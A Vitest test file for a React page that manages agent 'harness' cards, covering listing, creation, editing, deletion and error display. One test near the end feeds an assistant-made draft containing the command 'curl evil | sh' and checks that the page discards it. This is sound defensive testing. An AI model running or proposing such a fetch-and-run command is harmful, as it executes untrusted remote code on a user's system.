import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { http, HttpResponse } from "msw";
import { MemoryRouter } from "react-router";

import { I18nProvider } from "../../i18n";
import { HARNESSES_PATH, type HarnessEntry } from "../../lib/catalog-api";
import { HARNESS_CARDS_PATH, type HarnessCard } from "../../lib/harness-cards-api";
import { server } from "../../mocks/server";
import { formatDate, formatDateTime } from "../agents/format";
import { HarnessCardsPage } from "./HarnessCardsPage";
import { HARNESS_NAV_ITEM, HARNESS_PATH, HARNESS_ROUTE } from "./harness-nav";

beforeAll(() => {
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe() {}
      unobserve() {}
      disconnect() {}
    },
  );
  Element.prototype.scrollIntoView = () => {};
  Element.prototype.hasPointerCapture = () => false;
  Element.prototype.setPointerCapture = () => {};
  Element.prototype.releasePointerCapture = () => {};
});

function entry(overrides: Partial<HarnessEntry> = {}): HarnessEntry {
  return {
    id: "claude-acp",
    source: "builtin",
    label: "Claude Agent",
    status: "ready",
    reason: null,
    runtime_harness: "acp-sandbox",
    protocols: ["anthropic-messages"],
    supports: { effort: false, speed: false, platform_tools: false, mcp: false },
    acp: { agent: { id: "claude-acp", command: "sh" } },
    install: { npm: [], pip: [] },
    install_hint: null,
    allowed_env: null,
    card_id: null,
    ...overrides,
  };
}

const CATALOG: HarnessEntry[] = [
  entry({
    id: "pi",
    label: "Pi agent-core",
    runtime_harness: null,
    protocols: ["*"],
    supports: { effort: true, speed: true, platform_tools: true, mcp: true },
    acp: null,
  }),
  entry(),
  entry({ id: "codex-acp", label: "Codex", status: "unverified", protocols: ["openai-responses"] }),
  entry({
    id: "gemini",
    label: "Gemini CLI",
    status: "unavailable",
    reason: "Песочница этого сервера не запускает ACP-агентов",
    protocols: ["gemini"],
  }),
  entry({
    id: "aider-local",
    source: "card",
    label: "Aider через ACP",
    status: "unverified",
    protocols: ["openai-chat"],
    card_id: "hcard_1",
  }),
];

function card(overrides: Partial<HarnessCard> = {}): HarnessCard {
  return {
    id: "hcard_1",
    harness_id: "aider-local",
    name: "Aider через ACP",
    command: "aider-acp",
    args: ["--yes", "--model", "gpt-5"],
    cwd: "/mnt/session/outputs",
    install: { npm: ["@scope/pkg@1.2.3"], pip: ["aider-chat==0.86.1"] },
    protocols: ["openai-chat", "openai-responses"],
    allowed_env: ["AIDER_AUTO_COMMITS"],
    status: "unverified",
    created_at: "2026-10-14T10:00:00.000Z",
    updated_at: "2026-10-16T11:00:00.000Z",
    archived_at: null,
    ...overrides,
  };
}

/** Состояние «сервера» для одного теста: список карточек и журнал запросов. */
let cards: HarnessCard[];
let lists: URL[];
let posts: Array<{ url: string; body: unknown }>;
let deletes: string[];

beforeEach(() => {
  localStorage.clear();
  cards = [card()];
  lists = [];
  posts = [];
  deletes = [];
  server.use(
    http.get(`*${HARNESSES_PATH}`, () => HttpResponse.json({ data: CATALOG })),
    http.get(`*${HARNESS_CARDS_PATH}`, ({ request }) => {
      lists.push(new URL(request.url));
      return HttpResponse.json({ data: cards });
    }),
    http.delete(`*${HARNESS_CARDS_PATH}/:id`, ({ params }) => {
      deletes.push(String(params.id));
      cards = cards.filter((item) => item.id !== params.id);
      return HttpResponse.json({ type: "harness_card_deleted", id: params.id });
    }),
  );
});

function renderPage(state: unknown = null) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter initialEntries={[{ pathname: "/harnesses", state }]}>
        <I18nProvider>
          <HarnessCardsPage />
        </I18nProvider>
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

/** Таблица своих карточек после загрузки: строка с первой карточкой уже на месте. */
async function ownTable() {
  const table = await screen.findByRole("table", { name: "Данные списка" });
  await within(table).findByText("Aider через ACP");
  return table;
}

describe("страница «Harness»: шапка и встроенные", () => {
  it("называет страницу, объясняет назначение и даёт создать свой harness", async () => {
    renderPage();

    expect(await screen.findByRole("heading", { level: 1, name: "Harness" })).toBeInTheDocument();
    expect(
      screen.getByText(
        "Программа, которая ведёт ход агента. Встроенные варианты есть всегда, свой harness запускается в VM окружения по протоколу ACP.",
      ),
    ).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Новый harness" })).toBeEnabled();
  });

  it("показывает встроенные записи только для чтения: название, ID, протоколы, статус", async () => {
    renderPage();

    const section = (await screen.findByRole("heading", { name: "Встроенные" })).closest("section") as HTMLElement;
    await within(section).findByText("Встроенный цикл");
    const rows = within(section).getAllByRole("row").slice(1);
    expect(rows).toHaveLength(4);

    const pi = rows[0];
    expect(within(pi).getByText("Встроенный цикл")).toBeInTheDocument();
    expect(within(pi).getByText("pi", { selector: "span.font-mono" })).toBeInTheDocument();
    expect(within(pi).getByText("Любой")).toBeInTheDocument();
    expect(within(pi).getByText("Готово")).toBeInTheDocument();

    const claude = rows[1];
    expect(within(claude).getByText("Claude Code в песочнице")).toBeInTheDocument();
    expect(within(claude).getByText("Anthropic Messages")).toBeInTheDocument();

    expect(within(rows[2]).getByText("Не проверено")).toBeInTheDocument();
    expect(within(rows[2]).getByText("OpenAI Responses")).toBeInTheDocument();

    // Свою карточку из каталога сюда не кладём: она в блоке «Свои».
    expect(within(section).queryByText("Aider через ACP")).toBeNull();
  });

  it("у недоступной записи называет причину в подсказке", async () => {
    renderPage();

    const chip = await screen.findByText("Недоступно");
    expect(chip).toHaveAttribute("title", "Песочница этого сервера не запускает ACP-агентов");
  });

  it("встроенные записи не правятся: у блока нет кнопок и ссылок на правку", async () => {
    renderPage();

    const section = (await screen.findByRole("heading", { name: "Встроенные" })).closest("section") as HTMLElement;
    await within(section).findByText("Встроенный цикл");
    expect(within(section).queryByRole("button")).toBeNull();
  });

  it("пока каталог не пришёл, держит строки-заглушки, а при ошибке зовёт повторить", async () => {
    server.use(
      http.get(`*${HARNESSES_PATH}`, () =>
        HttpResponse.json({ error: "Сервер недоступен" }, { status: 503 }),
      ),
    );
    renderPage();

    expect(await screen.findByText("Не удалось загрузить встроенные harness")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Повторить" })).toBeInTheDocument();
  });
});

describe("страница «Harness»: свои карточки", () => {
  it("показывает колонки: название, ID, команда, протоколы, пакеты, статус, обновлено", async () => {
    renderPage();

    const table = await ownTable();
    const header = await screen.findByRole("table", { name: "Столбцы списка" });
    const names = within(header).getAllByRole("columnheader").map((node) => node.textContent);
    expect(names).toEqual(["Название", "ID", "Команда", "Протоколы", "Пакеты", "Статус", "Обновлён"]);

    const row = within(table).getAllByRole("row")[0];
    expect(within(row).getByText("Aider через ACP")).toBeInTheDocument();
    expect(within(row).getByText("aider-local")).toHaveClass("font-mono");
    expect(within(row).getByText("aider-acp --yes --model gpt-5")).toHaveAttribute(
      "title",
      "aider-acp --yes --model gpt-5",
    );
    expect(within(row).getByText("OpenAI Chat Completions")).toBeInTheDocument();
    expect(within(row).getByText("OpenAI Responses")).toBeInTheDocument();
    expect(within(row).getByText("pip aider-chat==0.86.1")).toBeInTheDocument();
    expect(within(row).getByText("npm @scope/pkg@1.2.3")).toBeInTheDocument();
    expect(within(row).getByText("Не проверено")).toBeInTheDocument();
    expect(within(row).getByText(formatDateTime("2026-10-16T11:00:00.000Z"))).toBeInTheDocument();
    // Дата создания скрыта, пока её не включат в меню столбцов.
    expect(within(row).queryByText(formatDate("2026-10-14T10:00:00.000Z"))).toBeNull();
  });

  it("копирует ID карточки", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    renderPage();

    await ownTable();
    await userEvent.click(await screen.findByRole("button", { name: "Скопировать ID aider-local" }));

    expect(writeText).toHaveBeenCalledWith("aider-local");
  });

  it("без своих карточек объясняет, что делать", async () => {
    cards = [];
    renderPage();

    expect(await screen.findByText("Своих harness нет")).toBeInTheDocument();
    expect(
      screen.getByText("Добавьте ACP-агента, которого нет среди встроенных."),
    ).toBeInTheDocument();
  });

  it("поиск уходит на сервер параметром q", async () => {
    renderPage();
    await ownTable();

    await userEvent.type(screen.getByRole("searchbox"), "aid");

    await waitFor(() => expect(lists.at(-1)?.searchParams.get("q")).toBe("aid"));
  });

  it("на MySQL своих harness нет: страница говорит об этом и не даёт создать", async () => {
    server.use(
      http.get(`*${HARNESS_CARDS_PATH}`, () =>
        HttpResponse.json({ error: "Свои harness на MySQL не поддерживаются" }, { status: 501 }),
      ),
    );
    renderPage();

    expect(await screen.findByText("Свои harness на MySQL не поддерживаются")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Новый harness" })).toBeDisabled();
    // Встроенные записи при этом на месте.
    expect(await screen.findByText("Встроенный цикл")).toBeInTheDocument();
  });

  it("при другой ошибке списка зовёт повторить", async () => {
    server.use(
      http.get(`*${HARNESS_CARDS_PATH}`, () =>
        HttpResponse.json({ error: "Сервер недоступен" }, { status: 503 }),
      ),
    );
    renderPage();

    expect(await screen.findByText("Не удалось загрузить свои harness")).toBeInTheDocument();
    expect(screen.getByRole("alert")).toHaveTextContent("Сервер недоступен");
  });
});

async function openCreateDialog() {
  await userEvent.click(screen.getByRole("button", { name: "Новый harness" }));
  return await screen.findByRole("dialog", { name: "Новый harness" });
}

describe("окно «Новый harness»", () => {
  it("показывает все поля с подсказками и статус «Не проверено»", async () => {
    renderPage();
    await ownTable();

    const dialog = await openCreateDialog();

    expect(within(dialog).getByRole("textbox", { name: "Название" })).toBeInTheDocument();
    const id = within(dialog).getByRole("textbox", { name: "ID" });
    expect(id).not.toHaveAttribute("readonly");
    expect(id).toHaveAccessibleDescription(
      "Латиница, цифры и дефис. Так harness записывается в агента",
    );
    expect(within(dialog).getByRole("textbox", { name: "Команда" })).toHaveAccessibleDescription(
      "Имя программы в VM или абсолютный путь. Программа говорит по ACP через stdin и stdout",
    );
    expect(within(dialog).getByRole("textbox", { name: "Аргументы" })).toBeInTheDocument();
    expect(within(dialog).getByRole("textbox", { name: "Рабочая папка" })).toHaveValue(
      "/mnt/session/outputs",
    );
    expect(within(dialog).getByRole("textbox", { name: "Пакеты npm" })).toBeInTheDocument();
    expect(within(dialog).getByRole("textbox", { name: "Пакеты pip" })).toBeInTheDocument();
    expect(
      within(dialog).getByText("Harness сам ничего не ставит. Добавьте эти пакеты в окружение сессии"),
    ).toBeInTheDocument();
    for (const name of ["Anthropic Messages", "OpenAI Chat Completions", "OpenAI Responses"]) {
      expect(within(dialog).getByRole("checkbox", { name })).not.toBeChecked();
    }
    expect(within(dialog).getByRole("textbox", { name: "Переменные окружения" })).toHaveAccessibleDescription(
      "Только имена. Значения задаются в агенте. Ключи сюда не кладите: модель подключается через прокси сервера",
    );
    expect(within(dialog).getByText("Не проверено")).toBeInTheDocument();
    expect(within(dialog).getByRole("button", { name: "Создать" })).toBeInTheDocument();
    expect(within(dialog).getByRole("button", { name: "Отмена" })).toBeInTheDocument();
  });

  it("не отправляет форму, пока не заполнены обязательные поля, и называет первое", async () => {
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();

    await userEvent.click(within(dialog).getByRole("button", { name: "Создать" }));

    expect(within(dialog).getByText("Укажите название")).toBeInTheDocument();
    expect(within(dialog).getByRole("textbox", { name: "Название" })).toHaveAttribute(
      "aria-invalid",
      "true",
    );
    expect(posts).toEqual([]);
  });

  it("создаёт карточку телом по контракту и обновляет список", async () => {
    server.use(
      http.post(`*${HARNESS_CARDS_PATH}`, async ({ request }) => {
        const body = await request.json();
        posts.push({ url: "create", body });
        cards = [card({ id: "hcard_2", harness_id: "new-one", name: "Новый" }), ...cards];
        return HttpResponse.json(cards[0], { status: 201 });
      }),
    );
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();

    await userEvent.type(within(dialog).getByRole("textbox", { name: "Название" }), "Новый");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "ID" }), "new-one");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Команда" }), "new-acp");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Аргументы" }), "--yes{enter}--fast");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Пакеты pip" }), "pkg==1.0");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Переменные окружения" }), "MY_FLAG");
    await userEvent.click(within(dialog).getByRole("checkbox", { name: "OpenAI Chat Completions" }));
    await userEvent.click(within(dialog).getByRole("button", { name: "Создать" }));

    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0].body).toEqual({
      name: "Новый",
      harness_id: "new-one",
      command: "new-acp",
      args: ["--yes", "--fast"],
      cwd: "/mnt/session/outputs",
      install: { npm: [], pip: ["pkg==1.0"] },
      protocols: ["openai-chat"],
      allowed_env: ["MY_FLAG"],
    });
    await waitFor(() => expect(screen.queryByRole("dialog", { name: "Новый harness" })).toBeNull());
    expect(await screen.findByText("new-one")).toBeInTheDocument();
  });

  it("ошибку сервера с полем показывает у этого поля и не закрывает окно", async () => {
    server.use(
      http.post(`*${HARNESS_CARDS_PATH}`, () =>
        HttpResponse.json(
          { error: "ID «claude-acp» занят встроенным harness", field: "harness_id" },
          { status: 400 },
        ),
      ),
    );
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Название" }), "Мой");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "ID" }), "claude-acp");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Команда" }), "x");
    await userEvent.click(within(dialog).getByRole("checkbox", { name: "OpenAI Responses" }));
    await userEvent.click(within(dialog).getByRole("button", { name: "Создать" }));

    const message = await within(dialog).findByText("ID «claude-acp» занят встроенным harness");
    const id = within(dialog).getByRole("textbox", { name: "ID" });
    expect(id).toHaveAttribute("aria-invalid", "true");
    expect(id).toHaveAccessibleDescription("ID «claude-acp» занят встроенным harness");
    expect(message).toBeInTheDocument();
    expect(screen.getByRole("dialog", { name: "Новый harness" })).toBeInTheDocument();

    // Правка поля снимает его ошибку.
    await userEvent.type(id, "2");
    expect(within(dialog).queryByText("ID «claude-acp» занят встроенным harness")).toBeNull();
  });

  it("ошибку без поля или с незнакомым полем показывает над кнопками", async () => {
    server.use(
      http.post(`*${HARNESS_CARDS_PATH}`, () =>
        HttpResponse.json({ error: "Harness с ID «aider-local» уже есть" }, { status: 409 }),
      ),
    );
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Название" }), "Мой");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "ID" }), "aider-local");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Команда" }), "x");
    await userEvent.click(within(dialog).getByRole("checkbox", { name: "OpenAI Responses" }));
    await userEvent.click(within(dialog).getByRole("button", { name: "Создать" }));

    expect(await within(dialog).findByRole("alert")).toHaveTextContent(
      "Harness с ID «aider-local» уже есть",
    );
  });

  it("ошибка по протоколам встаёт под группой флажков", async () => {
    server.use(
      http.post(`*${HARNESS_CARDS_PATH}`, () =>
        HttpResponse.json({ error: "Протокол gemini не поддерживается", field: "protocols" }, { status: 400 }),
      ),
    );
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Название" }), "Мой");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "ID" }), "my-one");
    await userEvent.type(within(dialog).getByRole("textbox", { name: "Команда" }), "x");
    await userEvent.click(within(dialog).getByRole("checkbox", { name: "OpenAI Responses" }));
    await userEvent.click(within(dialog).getByRole("button", { name: "Создать" }));

    const group = within(dialog).getByRole("group", { name: "Протоколы модели" });
    expect(await within(group).findByText("Протокол gemini не поддерживается")).toBeInTheDocument();
  });

  it("кнопка «Отмена» закрывает окно без запроса", async () => {
    renderPage();
    await ownTable();
    const dialog = await openCreateDialog();

    await userEvent.click(within(dialog).getByRole("button", { name: "Отмена" }));

    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(posts).toEqual([]);
  });
});

describe("правка и удаление карточки", () => {
  async function openEditByRowClick() {
    const table = await ownTable();
    await userEvent.click(within(table).getByText("Aider через ACP"));
    return await screen.findByRole("dialog", { name: "Harness «Aider через ACP»" });
  }

  it("открывает карточку по клику на строку: поля заполнены, ID только для чтения", async () => {
    renderPage();

    const dialog = await openEditByRowClick();

    expect(within(dialog).getByRole("textbox", { name: "Название" })).toHaveValue("Aider через ACP");
    const id = within(dialog).getByRole("textbox", { name: "ID" });
    expect(id).toHaveValue("aider-local");
    expect(id).toHaveAttribute("readonly");
    expect(within(dialog).getByRole("textbox", { name: "Команда" })).toHaveValue("aider-acp");
    expect(within(dialog).getByRole("textbox", { name: "Аргументы" })).toHaveValue("--yes\n--model\ngpt-5");
    expect(within(dialog).getByRole("textbox", { name: "Пакеты npm" })).toHaveValue("@scope/pkg@1.2.3");
    expect(within(dialog).getByRole("textbox", { name: "Пакеты pip" })).toHaveValue("aider-chat==0.86.1");
    expect(within(dialog).getByRole("checkbox", { name: "OpenAI Chat Completions" })).toBeChecked();
    expect(within(dialog).getByRole("checkbox", { name: "OpenAI Responses" })).toBeChecked();
    expect(within(dialog).getByRole("checkbox", { name: "Anthropic Messages" })).not.toBeChecked();
    expect(within(dialog).getByRole("textbox", { name: "Переменные окружения" })).toHaveValue(
      "AIDER_AUTO_COMMITS",
    );
    expect(within(dialog).getByRole("button", { name: "Сохранить" })).toBeInTheDocument();
  });

  it("сохраняет правку без смены ID: в теле нет harness_id", async () => {
    server.use(
      http.post(`*${HARNESS_CARDS_PATH}/:id`, async ({ request, params }) => {
        posts.push({ url: String(params.id), body: await request.json() });
        return HttpResponse.json(card({ name: "Переименован" }));
      }),
    );
    renderPage();
    const dialog = await openEditByRowClick();

    const name = within(dialog).getByRole("textbox", { name: "Название" });
    await userEvent.clear(name);
    await userEvent.type(name, "Переименован");
    await userEvent.click(within(dialog).getByRole("button", { name: "Сохранить" }));

    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0].url).toBe("hcard_1");
    expect(posts[0].body).not.toHaveProperty("harness_id");
    expect(posts[0].body).toMatchObject({
      name: "Переименован",
      command: "aider-acp",
      protocols: ["openai-chat", "openai-responses"],
    });
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
  });

  it("открывает правку и из меню строки", async () => {
    renderPage();
    const table = await ownTable();

    fireEvent.contextMenu(within(table).getByText("Aider через ACP"));
    await userEvent.click(await screen.findByRole("menuitem", { name: "Изменить" }));

    expect(await screen.findByRole("dialog", { name: "Harness «Aider через ACP»" })).toBeInTheDocument();
  });

  it("удаляет карточку после подтверждения: текст предупреждает про агентов", async () => {
    renderPage();
    const table = await ownTable();

    fireEvent.contextMenu(within(table).getByText("Aider через ACP"));
    await userEvent.click(await screen.findByRole("menuitem", { name: "Удалить" }));

    const confirm = await screen.findByRole("dialog", { name: "Удалить harness «Aider через ACP»?" });
    expect(confirm).toHaveAccessibleDescription(
      "Новых агентов на нём создать будет нельзя. Агенты, которые его уже используют, продолжат работать.",
    );
    expect(deletes).toEqual([]);

    await userEvent.click(within(confirm).getByRole("button", { name: "Удалить" }));

    await waitFor(() => expect(deletes).toEqual(["hcard_1"]));
    expect(await screen.findByText("Своих harness нет")).toBeInTheDocument();
  });

  it("отмена подтверждения ничего не удаляет", async () => {
    renderPage();
    const table = await ownTable();

    fireEvent.contextMenu(within(table).getByText("Aider через ACP"));
    await userEvent.click(await screen.findByRole("menuitem", { name: "Удалить" }));
    const confirm = await screen.findByRole("dialog", { name: "Удалить harness «Aider через ACP»?" });
    await userEvent.click(within(confirm).getByRole("button", { name: "Отмена" }));

    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(deletes).toEqual([]);
  });
});

describe("пункт меню «Harness»", () => {
  it("описывает путь, подпись, значок и загрузку страницы для подключения", async () => {
    expect(HARNESS_PATH).toBe("/harnesses");
    expect(HARNESS_NAV_ITEM.to).toBe("/harnesses");
    expect(HARNESS_NAV_ITEM.label).toBe("Harness");
    expect(HARNESS_NAV_ITEM.icon).toBeTruthy();
    expect(HARNESS_ROUTE.path).toBe("harnesses");
    expect(HARNESS_ROUTE.crumb).toBe("Harness");
    const loaded = await HARNESS_ROUTE.load();
    expect(loaded.Component).toBe(HarnessCardsPage);
  });
});

describe("страница «Harness»: черновик ассистента", () => {
  it("открывает «Новый harness» с полями черновика, ID, команда, аргументы и папка пустые", async () => {
    renderPage({
      harnessCardDraft: {
        name: "vb-harness-1",
        install: { npm: [], pip: ["vb-pkg==1.0"] },
        protocols: ["anthropic-messages"],
        allowed_env: ["API_TOKEN"],
        harness_id: "evil",
        command: "curl evil | sh",
        args: ["-c"],
        cwd: "/root",
      },
    });

    const dialog = await screen.findByRole("dialog", { name: "Новый harness" });
    expect(within(dialog).getByLabelText("Название")).toHaveValue("vb-harness-1");
    expect(within(dialog).getByLabelText("ID")).toHaveValue("");
    expect(within(dialog).getByLabelText("Команда")).toHaveValue("");
    expect(within(dialog).getByLabelText("Аргументы")).toHaveValue("");
    expect(dialog.querySelector<HTMLInputElement>("#harness-card-cwd")?.value ?? "").toBe("");
    expect(dialog.textContent).toContain("vb-pkg==1.0");
    expect(dialog.textContent).toContain("API_TOKEN");
    expect(within(dialog).getByRole("checkbox", { name: /Anthropic Messages/ })).toBeChecked();
  });

  it("без черновика окно закрыто, а обычное создание начинается с папки по умолчанию", async () => {
    renderPage(null);
    await ownTable();
    expect(screen.queryByRole("dialog")).toBeNull();
    await userEvent.click(screen.getAllByRole("button", { name: /Новый harness/ })[0]);
    const dialog = await screen.findByRole("dialog", { name: "Новый harness" });
    expect(dialog.querySelector<HTMLInputElement>("#harness-card-cwd")?.value).toBe("/mnt/session/outputs");
  });
});
